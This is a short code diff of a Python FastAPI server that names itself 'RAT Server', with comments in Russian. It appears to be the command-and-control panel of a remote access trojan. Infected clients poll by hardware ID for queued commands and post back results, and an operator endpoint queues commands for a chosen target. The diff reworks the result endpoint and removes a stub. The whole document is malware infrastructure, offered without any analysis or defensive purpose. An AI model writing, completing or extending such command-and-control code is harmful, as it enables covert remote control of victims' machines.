@@ -22,11 +22,6 @@ class CommandRequest(BaseModel):
     target: str
     command: dict
 
-class CommandResponse(BaseModel):
-    success: bool
-    message: str
-    data: Optional[dict] = None
-
 @app.get("/")
 async def index():
     return {"status": "OK", "service": "RAT Server"}
@@ -65,9 +60,11 @@ async def poll_commands(hwid: str):
     return {"commands": commands}
 
 @app.post("/client/result")
-async def client_result(hwid: str, result: dict):
+async def client_result(data: dict):
     """Клиент отправляет результат выполнения команды"""
     # Здесь можно сохранять результат для панели
+    hwid = data.get("hwid")
+    result = data.get("result", {})
     return {"status": "ok"}
 
 @app.get("/clients")
@@ -86,9 +83,3 @@ async def send_command(req: CommandRequest):
     
     pending_commands[req.target].append(req.command)
     return {"status": "ok", "message": "Command queued"}
-
-@app.post("/command/result")
-async def get_command_result(hwid: str, cmd_id: str):
-    """Панель получает результат выполнения команды"""
-    # Здесь логика получения результата
-    return {"status": "ok", "result": None}
